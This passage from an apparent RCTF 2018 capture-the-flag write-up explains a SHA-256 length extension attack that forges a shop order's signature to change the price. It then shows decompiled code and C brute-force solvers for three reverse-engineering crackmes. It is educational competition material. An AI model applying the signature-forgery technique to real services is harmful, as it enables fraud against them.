      $499\n     7 - AMD Ryzen 5 1600X             $249\n     8 - AMD Ryzen 3 1300X             $149\n     9 - Flag                          $99999\n\nThe flag is right there, but we need 99999 money to buy it, while the script always sets our budget to a random number in \\[1000, 10000\\]. However, the purchase is split into two parts - ordering and paying. We can order the flag, and get a string like:\n\n    product=Flag&price=99999&timestamp=1526990158350980&sign=efbde9d690dd7ea26876af15fef0450a5ebd037ebfb68954d5a5e700be503138\n\nBut if we actually try to use this order when paying, we get told we don't have enough money.\n\nAfter some brief analysis of how the order token is created, we see it is a textbook case of length extension attack, even down to the same query string format as presented on [Wikipedia](https://en.wikipedia.org/wiki/Length_extension_attack).\n\nSo the script creates a SHA-256 hash of `signkey` + `query`, where `signkey` is its private randomised key, and `query` is something like `product=Flag&price=99999&timestamp=1526990158350980`. The problem is that this is not a HMAC, nor is the hash encrypted before given to us. The hash / message digest produced by SHA-256 is actually its entire internal state at that point, i.e. we know that if we knew `signkey`, and created the SHA-256 hash of `signkey` + `query`, we would have no more data in our memory that what the digest provides.\n\nSo we need to find a SHA-256 implementation, edit it so we can change its internal state, and attach our extra string at the end, in this case `&price=1`, which will override the previous price of the flag product and make it affordable for us. This sort of attack also requires duplicating the way the padding algorithm works, but luckily, the Python script reads our input via `raw_input()`, which lets us input null bytes and binary data.\n\nFor the exploit I chose to use Haxe, since it is a language I am familiar with and it has a simple, native implementation of SHA-256 in its standard library.\n\nWe don't know what the length of `signkey` is, only that it is between 8 and 32 characters long. So the exploit will check all 24 possibilities (which differ in padding and length information only).\n\n([full exploit here](scripts/cpushop/Main.hx))\n\nAfter compiling, we can execute `neko exploit.n remote`, and with that we get:\n\n`RCTF{ha5h_l3ngth_ex7ens10n_a77ack_1s_ez}`\n\n## 540 Reverse / magic ##\n\n**Description**\n\n> right time, right spell, right flag.\n> \n> attachment: https://drive.google.com/open?id=13Di0J0NeDw6CeQ8W4wqKyLpx0vFtKZM0 \n\n**Solution**\n\nPut into IDA, look at `main`:\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  signed int v3; // eax\n  unsigned __int8 v5[32]; // [rsp+20h] [rbp-30h]\n  _DWORD a2[4]; // [rsp+48h] [rbp-8h]\n\n  sub_403310();\n  a2[1] = time64(0i64);\n  a2[0] = rand();\n  if ( exchange_by_xor(&a2[1], a2) && exchange_by_xor(&a2[1], &a2[1]) )\n  {\n    puts(\"flag only appears at a specific time, range [2018-05-19 09:00, 2018-05-21 09:00)\\nBetter luck next time :)\");\n  }\n    //...\n}\nunsigned __int32 __fastcall exchange_by_xor(_DWORD *a1, _DWORD *a2)\n{\n  *a1 ^= *a2;\n  *a2 ^= *a1;\n  *a1 ^= *a2;\n  return *a1;\n}//exchange the *a1 and *a2 only when a1 != a2, or else set all of them to 0\n```\n\nIn `main`, there are some operations: it seems that we want the first check to be false; however, it's already false, since the `xor_exchange` is problematic when a1 and a2 are same address (this has been coverd in CSAPP). And indeed, if we set breakpoint at the entrypoint of `main`, we will get error massage immediately, which suggests that the error message is **not the one from main function**.\n\nActually, I got stuck here for a while since initially I didn't realize it is a \"and\" but thought it is a \"or\" :(\n\nThus, if we set the breakpoint at `puts` to obtain where the message occurs, we can get a stack trace:\n\n```c\n__int64 __fastcall dynamic_str_gen(char *a4, char *a3, signed int size, char *buf)\n{\n  unsigned int v4; // ST2C_4\n  const char *a4a; // [rsp+40h] [rbp+10h]\n  signed int a3a; // [rsp+48h] [rbp+18h]\n  int a5a; // [rsp+50h] [rbp+20h]\n\n  a4a = a4;\n  a3a = (signed int)a3;\n  a5a = size;\n  xor_with_32key((unsigned int)a4, (unsigned int)a3, size);\n  v4 = puts(a4a);\n  xor_with_32key((unsigned int)a4a, a3a, a5a);\n  return v4;\n}\n\n__int64 __fastcall sub_402357(__time64_t *a1, char **a2)\n{\n  __int64 result; // rax\n  int v3; // eax\n  char *v4; // r9\n\n  sub_402268(a1, (__int64)a2);\n  result = (unsigned int)not_0_key[0];\n  if ( !not_0_key[0] )\n  {//we don't want this, so need not_0_key[0] to be true\n    v3 = strtol(\"ca11ab1e\", 0i64, 16);\n    result = dynamic_str_gen(&a4, (char *)0x69, v3 ^ 0xBADD1917, v4);\n  }\n  return result;\n}\n\n/*\n0000000000402248\n00000000004023AA\n00000000004032D2//possibly system callback call(retrieve things from array)\n//000007FF756A13D2\n00000000004013CA\n000000000040152B\n//0000000078D359CD\n*/\n```\n\nIndeed, this is called before `main` function is called. So when will this happen? For example, in C++, the constructor of any global object will be called before `main` is called.\n\nTake a look at `sub_402268`:\n\n```c\n__int64 __fastcall sub_402268(__time64_t *a1, __int64 a2)\n{\n  __int64 result; // rax\n  char *v3; // r9\n  unsigned __int32 v4[2]; // [rsp+20h] [rbp-10h]\n  unsigned int Seed; // [rsp+28h] [rbp-8h]\n  int i; // [rsp+2Ch] [rbp-4h]\n\n  Seed = time64(0i64);\n  if ( Seed <= 0x5AFFE78F || Seed > 0x5B028A8F )\n    return 0i64;\n  srand(Seed);\n  for ( i = 0; i <= 255; ++i )\n    critical_key[i] ^= rand();\n  //This function is basically to generate an array of random numbers\n  //based on current time64(), which is the input as the hint said.\n  sub_4027ED(critical_key, &v4[1], v4, v3, 0i64);\n  if ( v4[1] == 0x700 )\n  {\n    not_0_key[0] = v4[0];                       // purpose\n    result = v4[0];\n  }\n  else\n  {\n    not_0_key[0] = 0;\n    result = 0i64;\n  }\n  return result;\n}\n\n_DWORD *__fastcall sub_4027ED(char *a1, _DWORD *a2, \n                              _DWORD *want_0x700, char *critical_key, _DWORD *want_no0)\n{\n  _DWORD *result; // rax\n  __int64 v6; // [rsp+0h] [rbp-80h]\n  struc_1 a4[256]; // [rsp+20h] [rbp-60h]\n  int i; // [rsp+C2Ch] [rbp+BACh]\n  char vars0[8]; // [rsp+C30h] [rbp+BB0h]\n  char *ckeys; // [rsp+C40h] [rbp+BC0h]\n  _DWORD *v11; // [rsp+C48h] [rbp+BC8h]\n  _DWORD *v12; // [rsp+C50h] [rbp+BD0h]\n\n  ckeys = a1;\n  v11 = a2;\n  v12 = want_0x700;\n  memset(&v6 + 4, 0, 0xC00ui64);\n  for ( i = 0; i <= 255; ++i )\n  {\n    vars0[12 * i - 0xC10] = ckeys[i];           // IDA problematic? a4[i] accessing\n    *(_DWORD *)&vars0[12 * i - 0xC0C] = 0x7FFFFFFF;\n    *(_DWORD *)&vars0[12 * i - 0xC08] = 0;\n    sub_4026D0(a4, i);\n  }\n  *v11 = a4[255].want_0x700;\n  result = v12;\n  *v12 = a4[255].want_no0;\n  return result;\n}\n\nvoid __fastcall sub_4026D0(struc_1 *a4, unsigned int i)\n{\n  struc_1 *low_16_struc1; // rax\n  struc_1 *v3; // rax\n  int v4; // [rsp+24h] [rbp-1Ch]\n  struc_1 *low_16_struc1_; // [rsp+30h] [rbp-10h]\n  struc_1 *overall_struc1; // [rsp+38h] [rbp-8h]\n  struc_1 *rcx_Arg; // [rsp+50h] [rbp+10h]\n  unsigned int idx; // [rsp+58h] [rbp+18h]\n\n  rcx_Arg = a4;\n  idx = i;\n  overall_struc1 = safe_arr_access(a4, i);\n  if ( overall_struc1 )\n  {\n    if ( idx & 0xF )\n      low_16_struc1 = safe_arr_access(rcx_Arg, idx - 1);\n    else\n      low_16_struc1 = 0i64;\n    low_16_struc1_ = low_16_struc1;\n    if ( idx + 15 <= 30 )                       // if (idx <= 15)\n      v3 = 0i64;\n    else\n      v3 = safe_arr_access(rcx_Arg, idx - 16);  // >15, access -16\n                                                // so for first 0-15,this will return 0\n    if ( low_16_struc1_ || v3 )\n    {\n      if ( low_16_struc1_ )\n      {\n        overall_struc1->want_0x700 = overall_struc1->key + low_16_struc1_->want_0x700;\n        overall_struc1->want_no0 = 2 * low_16_struc1_->want_no0;\n      }\n      if ( v3 )\n      {\n        v4 = v3->want_0x700 + overall_struc1->key;\n        if ( v4 < overall_struc1->want_0x700 )\n        {\n          overall_struc1->want_0x700 = v4;\n          overall_struc1->want_no0 = 2 * v3->want_no0 | 1;\n        }\n      }\n    }\n    else\n    {\n      overall_struc1->want_0x700 = overall_struc1->key;\n    }\n  }\n}\n\n/* where struc_1 is\n00000000 struc_1         struc ; (sizeof=0xC, mappedto_17)\n00000000                                         ; XREF: sub_4027ED/r\n00000000 key             db ?\n00000001                 db ? ; undefined\n00000002                 db ? ; undefined\n00000003                 db ? ; undefined\n00000004 want_0x700      dd ?                    ; XREF: sub_4027ED+10C/r\n00000008 want_no0        dd ?                    ; XREF: sub_4027ED+11B/r\n0000000C struc_1         ends\n*/\n```\n\n`sub_4026D0` is doing dynamic programming using previous result of array, being called each time in the `for` loop of `sub_4027ED`. Finally, the element at index 255 will be used to check.\n\nWithout understanding what this dynamic programming is doing, we can write a bruteforce crack as shown.\n\n```c\nuint8_t ckeys1[] = {88, 113, 143, 50, 5, 6, 81, 199, 167, 248, 58, 225, 6, 72, 130, 9, 161, 18, 159, 124, 184, 42, 111, 149, 253, 208, 103, 200, 227, 206, 171, 18, 31, 152, 107, 20, 234, 137, 144, 33, 45, 253, 154, 187, 71, 204, 234, 156, 215, 80, 39, 175, 185, 119, 223, 197, 233, 225, 80, 211, 56, 137, 239, 45, 114, 194, 223, 243, 125, 125, 101, 149, 237, 19, 0, 28, 163, 60, 227, 87, 227, 247, 247, 44, 115, 136, 52, 177, 98, 211, 55, 25, 38, 190, 178, 51, 32, 63, 96, 57, 135, 166, 101, 173, 115, 26, 109, 73, 51, 73, 192, 86, 0, 190, 10, 207, 40, 126, 142, 105, 135, 225, 5, 136, 218, 84, 62, 60, 14, 169, 250, 215, 127, 78, 68, 198, 154, 10, 210, 152, 106, 164, 25, 109, 140, 225, 249, 48, 229, 255, 51, 74, 169, 82, 58, 13, 103, 32, 29, 191, 54, 62, 232, 86, 191, 90, 136, 168, 105, 214, 171, 82, 241, 20, 242, 215, 239, 146, 247, 160, 112, 161, 239, 227, 31, 102, 43, 151, 246, 43, 48, 15, 176, 180, 192, 254, 166, 98, 253, 230, 76, 57, 207, 32, 179, 16, 96, 159, 52, 190, 178, 28, 59, 107, 29, 223, 83, 114, 242, 250, 177, 81, 130, 4, 48, 86, 31, 55, 114, 122, 151, 80, 41, 134, 74, 9, 60, 89, 196, 65, 113, 248, 26, 210, 48, 136, 99, 255, 133, 222, 36, 140, 195, 55, 20, 199};\nuint8_t buf[256];\nstruct struc_1\n{\n\tint8_t key;\n    //not uint8_t, which will give multiple solutions\n    //obey the IDA, always !!!\n\tint32_t want_0x700;\n\tint32_t want_no0;\n};\n\nstruct struc_1 dp_struc[256];\n\nstruc_1* safe_arr_access(struc_1 *structs, signed int i)\n{\n\tstruc_1 *result; // rax\n\n\tif (i >= 0 && i <= 255)\n\t\tresult = &structs[i];\n\telse\n\t\tresult = 0LL;\n\treturn result;\n}\n\nvoid sub_4026D0(struc_1 *a4, unsigned int i)\n{\n\tstruc_1 *low_16_struc1; // rax\n\tstruc_1 *v3; // rax\n\tint v4; // [rsp+24h] [rbp-1Ch]\n\tstruc_1 *low_16_struc1_; // [rsp+30h] [rbp-10h]\n\tstruc_1 *overall_struc1; // [rsp+38h] [rbp-8h]\n\tstruc_1 *rcx_Arg; // [rsp+50h] [rbp+10h]\n\tunsigned int idx; // [rsp+58h] [rbp+18h]\n\n\trcx_Arg = a4;\n\tidx = i;\n\toverall_struc1 = safe_arr_access(a4, i);\n\tif (overall_struc1)\n\t{\n\t\tif (idx & 0xF)\n\t\t\tlow_16_struc1 = safe_arr_access(rcx_Arg, idx - 1);\n\t\telse\n\t\t\tlow_16_struc1 = 0i64;\n\t\tlow_16_struc1_ = low_16_struc1;\n\t\tif (idx + 15 <= 30)                       // if (idx <= 15)\n\t\t\tv3 = 0;\n\t\telse\n\t\t\tv3 = safe_arr_access(rcx_Arg, idx - 16);  // >15, access -16\n\t\t\t\t\t\t\t\t\t\t\t\t\t  // so for first 0-15,this will return 0\n\t\tif (low_16_struc1_ || v3)\n\t\t{\n\t\t\tif (low_16_struc1_)\n\t\t\t{\n\t\t\t\toverall_struc1->want_0x700 = overall_struc1->key + low_16_struc1_->want_0x700;\n\t\t\t\toverall_struc1->want_no0 = 2 * low_16_struc1_->want_no0;\n\t\t\t}\n\t\t\tif (v3)\n\t\t\t{\n\t\t\t\tv4 = v3->want_0x700 + overall_struc1->key;\n\t\t\t\tif (v4 < overall_struc1->want_0x700)\n\t\t\t\t{\n\t\t\t\t\toverall_struc1->want_0x700 = v4;\n\t\t\t\t\toverall_struc1->want_no0 = 2 * v3->want_no0 | 1;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\toverall_struc1->want_0x700 = overall_struc1->key;\n\t\t}\n\t}\n}\n\nint main()\n{\n\tfor (size_t t = 0x5AFFE78F; t <= 0x5B028A8F; t++)\n\t{\n\t\tsrand(t);\n\t\tfor (size_t i = 0; i < 256; i++)\n\t\t{\n\t\t\tbuf[i] = ckeys1[i] ^ rand();\n\t\t}\n\t\tfor (size_t i = 0; i < 256; i++)\n\t\t{\n\t\t\tdp_struc[i].key = buf[i];\n\t\t\tdp_struc[i].want_0x700 = 0x7fffffff;\n\t\t\tdp_struc[i].want_no0 = 0;\n\t\t\tsub_4026D0(dp_struc, i);\n\t\t}\n\t\tif (dp_struc[255].want_0x700 == 0x700 && dp_struc[255].want_no0 != 0)\n\t\t\tprintf(\"%x\\n\", t);//0x5b00e398\n\t}\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\n\nPatching `time64()` to `mov rax,0x5b00e398`, we can proceed to the next phase. Also, by setting breakpoints at `puts`, we can get this stack frame:\n\n```c\n//0000000000402248\n//0000000000402407\n__int64 __fastcall critical_4023B1(char *a1, __int64 a2, __int64 a3, char *a4)\n{\n  char *v4; // r9\n  const char *v5; // rcx\n  char *v6; // r9\n  char *v7; // r9\n  struc_2 *input; // [rsp+20h] [rbp-30h]\n  __int64 v10; // [rsp+28h] [rbp-28h]\n  __int64 v11; // [rsp+30h] [rbp-20h]\n  __int64 v12; // [rsp+38h] [rbp-18h]\n  struc_2 a5; // [rsp+43h] [rbp-Dh]\n\n  if ( !not_0_key[0] )\n    exit(0);\n  LOBYTE(a5.field_0) = 0;\n  a5.field_0 = not_0_key[0];\n  dynamic_str_gen(&buf, (char *)0x31, not_0_key[0], a4);\n  input = 0i64;\n  v10 = 0i64;\n  v11 = 0i64;\n  v12 = 0i64;\n  LODWORD(input) = 538976288;\n  a5.input = (char *)&input + 4;\n  scanf(\"%26s\", (char *)&input + 4);\n  sym_encode((__int64)a5.input, 26i64, (unsigned __int64)&a5, (char *)4, input, v10);\n  if ( !(unsigned int)need_return_non0(a5.input) )\n    return dynamic_str_gen(&byte_4052D1, (char *)6, not_0_key[0], v4);\n  sym_encode((__int64)a5.input, 26i64, (unsigned __int64)&a5, (char *)4, input, v10);\n  sub_401FFB(v5);\n  dynamic_str_gen(&byte_4052E0, (char *)0x23, not_0_key[0], v6);\n  puts((const char *)&input);\n  return dynamic_str_gen(&byte_4052E0, (char *)0x23, not_0_key[0], v7);\n}\n\n__int64 __usercall need_return_non0@<rax>(char *input@<rcx>)\n{\n  int opcode; // eax\n  int v2; // eax\n  char Buf; // [rsp+20h] [rbp-110h]\n  unsigned int v5; // [rsp+124h] [rbp-Ch]\n  int v6; // [rsp+128h] [rbp-8h]\n  int nxt_ip; // [rsp+12Ch] [rbp-4h]\n\n  strncpy(::input, input, 0x1Aui64);\n  signal(SIGFPE, sub_402930);\n  nxt_ip = 0;\n  v6 = 1;\n  v5 = 0;\n  r1 = (unsigned __int64)keys;\n  r2 = (unsigned __int64)::input;\n  while ( v6 )\n  {\n    opcode = setjmp(&Buf);                      // pre: nxt ip opcode + 1\n                                                // post: next instruction opcode\n    if ( opcode == 168 )\n    {\n      reg[vmcode[nxt_ip] >> 4] -= reg[vmcode[nxt_ip] & 0xF];\n      ++nxt_ip;\n    }\n    else if ( opcode > 168 )\n    {\n      if ( opcode == 172 )\n      {\n        reg[vmcode[nxt_ip] >> 4] &= reg[vmcode[nxt_ip] & 0xF];\n        ++nxt_ip;\n      }\n      else if ( opcode > 172 )\n      {\n        if ( opcode == 174 )\n        {\n          reg[vmcode[nxt_ip] >> 4] ^= reg[vmcode[nxt_ip] & 0xF];\n          ++nxt_ip;\n        }\n        else if ( opcode < 174 )\n        {                                       // 173\n          reg[vmcode[nxt_ip]] = (unsigned __int8)~LOBYTE(reg[vmcode[nxt_ip]]);\n          ++nxt_ip;\n        }\n        else\n        {\n          if ( opcode != 175 )\n            goto LABEL_43;\n          r8_ = vmcode[nxt_ip] >> 4;            // 175\n          r9_ = vmcode[nxt_ip] & 0xF;\n          if ( !setjmp(::Buf) )                 // always 0 FIRST TIME\n            vmcode[nxt_ip] = r8_ / vmcode[nxt_ip + 1];\n          nxt_ip += 2;\n        }\n      }\n      else if ( opcode == 170 )\n      {\n        reg[vmcode[nxt_ip]] = reg[vmcode[nxt_ip + 1]];\n        nxt_ip += 2;\n      }\n      else if ( opcode > 170 )                  // 171\n      {\n        reg[vmcode[nxt_ip]] = vmcode[nxt_ip + 1];\n        nxt_ip += 2;\n      }\n      else\n      {                                         // 169\n        reg[vmcode[nxt_ip] >> 4] += reg[vmcode[nxt_ip] & 0xF];\n        ++nxt_ip;\n      }\n    }\n    else if ( opcode == 163 )\n    {\n      reg[vmcode[nxt_ip] >> 4] |= reg[vmcode[nxt_ip] & 0xF];\n      ++nxt_ip;\n    }\n    else if ( opcode > 163 )                    // < 168\n    {\n      if ( opcode == 166 )\n      {\n        if ( !r5 )\n          nxt_ip += (char)vmcode[nxt_ip];\n        ++nxt_ip;\n      }\n      else if ( opcode > 166 )                  // 167\n      {\n        if ( r5 )\n          nxt_ip += (char)vmcode[nxt_ip];\n        ++nxt_ip;\n      }\n      else\n      {\n        if ( opcode != 165 )\n          goto LABEL_43;\n        nxt_ip += vmcode[nxt_ip];\n        ++nxt_ip;\n      }\n    }\n    else if ( opcode == 160 )\n    {\n      reg[vmcode[nxt_ip]] = *(unsigned __int8 *)reg[vmcode[nxt_ip]];\n      ++nxt_ip;\n    }\n    else if ( opcode == 162 )\n    {\n      ++nxt_ip;\n      reg[vmcode[nxt_ip]] >>= reg[vmcode[nxt_ip]];\n      ++nxt_ip;\n    }\n    else\n    {\n      if ( !opcode )\n      {\n        v2 = nxt_ip++;\n        longjmp_0(&Buf, vmcode[v2]);\n      }\nLABEL_43:\n      v6 = 0;\n      v5 = r5;\n    }\n  }\n  return v5;\n}\n```\n\n`need_return_non0` is a virtual machine based on `setjmp`, which returns 0 at the first time, and returns non-zero by calling `long_jmp`, which is the opcode as shown. More detail: [http://en.cppreference.com/w/cpp/utility/program/setjmp](http://en.cppreference.com/w/cpp/utility/program/setjmp)\n\nThe opcodes are not so long and not so hard, so I did it by hand. One instruction is interesting:\n\n```c\n          r8_ = vmcode[nxt_ip] >> 4;            // 175\n          r9_ = vmcode[nxt_ip] & 0xF;\n          if ( !setjmp(::Buf) )                 // always 0 FIRST TIME\n            vmcode[nxt_ip] = r8_ / vmcode[nxt_ip + 1]; \n            // for every 175 instruction, this is 0\n            // which throw the exception being handled in sub_402930\n          nxt_ip += 2;\n\nvoid __fastcall __noreturn sub_402930(__int64 a1, void (__cdecl *a2)(int), __int64 a3, int a4)\n{\n  if ( (_DWORD)a1 == SIGFPE )\n  {\n    signal(SIGFPE, sub_402930);\n    reg[r8_] = reg[r8_] == reg[r9_];\n    longjmp_0(Buf, 0);\n  }\n  exit(1);\n}\n/*\nThis actually means\n175: \nr8=rah, r9=ral\nif (bb == 0)\n  r[r8] = reg[r8] == reg[r9]\nelse\n  aa = r8 / bb\n\nwhere\naa is first agument, bb is second argument\nxh is high nibble, xl is low nibble\n\nThis can be used to do conditional jmp\n*/\n```\n\nAfter translating, the virtual machine is basically doing:\n\n```\n; r1 = (unsigned __int64)keys;\n; r2 = (unsigned __int64)::input;\nmovzx r3,0\nmovzx r4,26\nmovzx r0,102\nloop:\nmov r5,r2\nadd r8,r3\nmovzx r5, byte [r5]\nmov r6,204\nadd, r8,r6\nmovzx r6,255\nand r8,r6\nxor r8,r0\nnot r0\nmov r6,r5\nmov r5,r1\nadd 83\nmovzx r5,[r5]\nr8 = 0, r9 = 6\nr5 jmp next:\nreturn r5\nnext:\nadd 53\nmov r5,r3\nr8 = 0, r9 = 4\n!r5 jmp ? jmp loop\nreturn r5\n\n175: \nr8=rah, r9=ral\nif (bb == 0)\n  r[r8] = reg[r8] == reg[r9]\nelse\n  aa = r8 / bb\n\n174: xor rah,ral\n173: not raa(LOBYTE)\n172: and rah,ral\n171: movzx raa, bb\n170: mov raa,rbb\n169: add rah,ral\n167: r5 ? jmp nxtins + (sx)aa\n166: !r5 ? jmp nxtins + (sx)aa\n160: movzx raa,byte [raa]\n\naa is first agument, bb is second argument\nxh is high nibble, xl is low nibble\n```\n\nWhich is not hard to understand and write a bruteforce cracker for!\n\n```c\nint main2()\n{\n\tuint8_t r0 = 102;\n\tfor (size_t i = 0; i < 26; i++)\n\t{\n\t\tfor (int c = 0; c < 256; c++)\n\t\t{\n\t\t\tif ((((c + 204) & 0xff) ^ r0) == ckeys2[i])\n\t\t\t{\n\t\t\t\tprintf(\"%.2x\", (uint8_t)c);\n\t\t\t}\n\t\t}\n\t\tr0 = ~r0;\n\t}//238cbefd25d765f4b6b3b60fe174a2effc384ed21a4ab11096a5\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\n\nHowever, this is not the flag, `sym_encode` is used to encode input first, so we need to find an input that, when put into this encode function, produces the result above. However, we don't need reverse this function, this encoding is symetric, bacause it is called twice to the same input, and it gives input (you may see this by debugging and changing the ZF bit even if the input is incorrect), so `encode(encode(x)) = x`, which means `encode` = `decode`. So what we need to do is to debug, set a breakpoint at `sym_encode`, run and give it an arbitrary input, change the buffer of input to `238cbefd25d765f4b6b3b60fe174a2effc384ed21a4ab11096a5`, step over `sym_encode`, and see the flag in the buffer.\n\n![input](screens/magic-flag.png)\n\nAnd if we put this into the program, we can see:\n\n![result](screens/magic-result.png)\n\nInitially I didn't realize what this is, but after sending it by IM to ask my teammates for help, I found that it is `rctf{h` clearly since the picture is smaller in messenger :D\n\nSo the flag is:\n\n`rctf{h@ck_For_fun_02508iO2_2iOR}`\n\n## 161 Reverse / babyre ##\n\n**Description**\n\n> attachment: https://drive.google.com/open?id=15zha76BScH2HlpLz4lw15poN2kLZIcEX \n\n**Solution**\n\nThere is a lot of useless code in this program, and it is unnecessary to reverse it. The only critical function is:\n\n```c\nint __cdecl sub_80488E0(char *s, __int64 c, int seed, int a5, int a6)\n{\n  unsigned int v5; // ST4C_4\n  int i; // [esp+1Ch] [ebp-1Ch]\n\n  memset(s, 0, 0x20u);\n  scanf(\"%s\", s);//get input\n  for ( i = 0; i <= 29; ++i )\n  {\n    v5 = critical_hash(s[i], c, seed, a6, a5);\n    printf(\"%lx\\n\", v5);\n  }\n  return i;\n}\n```\n\nThe second argument is a given constant; `s` is a buffer; the last 3 arguments are decided by debugging, which depends on seed that we input and the uninitialised local variable access (possibly UB?), and they can be differ based on input or separate program instances. However, what I did is to obtain these 3 arguments by gdb debugging with arbitrary input seed, and it works!\n\nBy the way, the first input in the main fuction is useless, it does not affect the result.\n\nI did not reverse the `critical_hash` function, but did by bruteforce attack.\n\n```c\n#include <stdio.h>\n#include <memory.h>\n\nunsigned int keys[] =\n{\n0xB80C91FE,0x70573EFE,\n0xBEED92AE,0x7F7A8193,\n0x7390C17B,0x90347C6C,\n0xAA7A15DF,0xAA7A15DF,\n0x526BA076,0x153F1A32,\n0x545C15AD,0x7D8AA463,\n0x526BA076,0xFBCB7AA0,\n0x7D8AA463,0x9C513266,\n0x526BA076,0x6D7DF3E1,\n0xAA7A15DF,0x9C513266,\n0x1EDC3864,0x9323BC07,\n0x7D8AA463,0xFBCB7AA0,\n0x153F1A32,0x526BA076,\n0xF5650025,0xAA7A15DF,\n0x1EDC3864,0xB13AD888\n};\n\nunsigned int critical_hash(unsigned int a1, unsigned long long a2, int a3, int a4, int a5)\n{\n  unsigned long long v5; // rax\n  unsigned int i; // [esp+1Ch] [ebp-ACh]\n  unsigned int v8; // [esp+20h] [ebp-A8h]\n  unsigned int j; // [esp+24h] [ebp-A4h]\n  int ub_hash; // [esp+28h] [ebp-A0h]\n  int s[32]; // [esp+2Ch] [ebp-9Ch]\n  unsigned int v12; // [esp+ACh] [ebp-1Ch]\n\n  memset(s, 0, 0x20u);\n  for ( i = 0; i <= 0x1D; ++i )\n    s[i] = (4 * a3 + ub_hash) ^ a5 ^ a4;\n  v8 = a1;\n  for ( j = 0; j <= 527; ++j )\n  {\n    v5 = a2 >> (j & 0x1F);\n    if ( j & 0x20 )\n      v5 = (v5 >> 32) | (v5 & 0xffffffff00000000LL) ;\n    v8 = (v8 >> 1) ^ (((unsigned int)v5 ^ v8 ^ (v8 >> 16) ^ (1551120942 >> (((v8 >> 1) & 1)\n                                                                          + 2\n                                                                          * (2\n                                                                           * (((v8 >> 20) & 1)\n                                                                            + 2\n                                                                            * (2 * ((v8 & 0x80000000) != 0)\n                                                                             + ((v8 >> 26) & 1)))\n                                                                           + ((v8 >> 9) & 1))))) << 31);\n  }\n  return v8;\n}\n\nint solve()\n{\n\tunsigned int v5; // ST4C_4\n\tint i; // [esp+1Ch] [ebp-1Ch]\n\tchar flag[0x20];\n\tmemset(flag, 0, 0x20u);\n\n\tfor (i = 0; i <= 29; ++i )\n\t{\n\t\tfor (int c = 0; c < 256; ++c)\n\t\t{\n\t\t\tv5 = critical_hash(c, \n       /*value obtained from gdb pwndbg*/0x1D082C23A72BE4C1LL, 0xffff9cc0, 0x6e00, 0x6e);\n\t\t\tif (v5 == keys[i])\n\t\t\t{\n\t\t\t\tprintf(\"%c\", c);\n\t\t\t}\n\t\t}\n\t}\n\n\treturn i;\n}\n\nint main(int argc, char const *argv[])\n{\n\tsolve();\n\treturn 0;\n}\n```\n\n`RCTF{Kee1o9_1s_a1ready_so1ved}`\n\n## 317 Reverse / simple vm ##\n\n**Description**\n\n> Please submit RCTF{\\<WhatYouInput\\>}. \n> \n> attachment: https://drive.google.com/open?id=1AQykwr6bNklqdtaVkFs0B79QAyrixXnd \n\n**Solution**\n\nAs the name indicates, the core of this challenge was a virtual machine with custom opcodes and emulation:\n\n```c\n__int64 sub_400896()\n{//code of vm engine\n  __int64 instr_pointer; // rax\n  _BYTE *vm_code; // rbp\n  int nxt_instr_pointer; // ebx\n  __int64 v4; // rdx\n  __int64 v5; // rax\n  __int64 v6; // rax\n  __int64 v7; // rax\n  __int64 v8; // rax\n  __int64 v9; // rax\n  int v10; // eax\n  __int64 v11; // rax\n  char v12; // dl\n  int v13; // eax\n  int v14; // eax\n  _BYTE *v15; // rax\n  __int64 v16; // rax\n  __int64 v17; // rax\n  __int64 v18; // rax\n\n  instr_pointer = 0LL;\n  vm_code = ::vm_code;\n  while ( 1 )\n  {\n    nxt_instr_pointer = instr_pointer + 1;\n    switch ( vm_code[instr_pointer] )\n    {\n      case 0:\n        return *(unsigned int *)&vm_code[nxt_instr_pointer];\n      case 1:\n        goto LABEL_35;\n      case 2:\n        v4 = nxt_instr_pointer;\n        nxt_instr_pointer = instr_pointer + 9;\n        vm_code[*(signed int *)&vm_code[v4]] = *(_DWORD *)&vm_code[(signed int)instr_pointer + 5];\n        break;\n      case 3:\n        v5 = nxt_instr_pointer;\n        nxt_instr_pointer += 4;\n        v6 = *(signed int *)&vm_code[v5];\n        goto LABEL_27;\n      case 4:\n        v7 = nxt_instr_pointer;\n        nxt_instr_pointer += 4;\n        v8 = *(signed int *)&vm_code[v7];\n        goto LABEL_31;\n      case 5:\n        v9 = nxt_instr_pointer;\n        nxt_instr_pointer += 4;\n        v10 = (char)vm_code[*(signed int *)&vm_code[v9]];\n        goto LABEL_21;\n      case 6:\n        v11 = nxt_instr_pointer;\n        v12 = g_var;\n        nxt_instr_pointer += 4;\n        v8 = *(signed int *)&vm_code[v11];\n        goto LABEL_9;\n      case 7:\n        v13 = g_var;\n        goto LABEL_23;\n      case 8:\n        v14 = ~(g_var & condition);\n        goto LABEL_12;\n      case 0xA:\n        v14 = getchar();\n        goto LABEL_12;\n      case 0xB:\n        putchar(condition);\n        break;\n      case 0xC:\n        v15 = &vm_code[*(signed int *)&vm_code[nxt_instr_pointer]];\n        if ( *v15 )\n        {\n          nxt_instr_pointer = *(_DWORD *)&vm_code[nxt_instr_pointer + 4];\n          --*v15;\n        }\n        else\n        {\n          nxt_instr_pointer += 8;\n        }\n        break;\n      case 0xD:\n        ++condition;\n        break;\n      case 0xE:\n        ++g_var;\n        break;\n      case 0xF:\n        v14 = g_var;\n        goto LABEL_12;\n      case 0x10:\n        v10 = condition;\n        goto LABEL_21;\n      case 0x11:\n        v16 = nxt_instr_pointer;\n        nxt_instr_pointer += 4;\n        v13 = *(_DWORD *)&vm_code[v16];\nLABEL_23:\n        condition += v13;\n        break;\n      case 0x12:\n        v6 = g_var;\n        goto LABEL_27;\n      case 0x13:\n        v6 = condition;\nLABEL_27:\n        v14 = (char)vm_code[v6];\n        goto LABEL_12;\n      case 0x14:\n        v17 = nxt_instr_pointer;\n        nxt_instr_pointer += 4;\n        v14 = *(_DWORD *)&vm_code[v17];\n        goto LABEL_12;\n      case 0x15:\n        v18 = nxt_instr_pointer;\n        nxt_instr_pointer += 4;\n        v10 = *(_DWORD *)&vm_code[v18];\nLABEL_21:\n        g_var = v10;\n        break;\n      case 0x16:\n        v8 = g_var;\nLABEL_31:\n        v12 = condition;\nLABEL_9:\n        vm_code[v8] = v12;\n        break;\n      case 0x17:\n        v14 = condition - g_var;\nLABEL_12:\n        condition = v14;\n        break;\n      case 0x18:\n        if ( condition )\nLABEL_35:\n          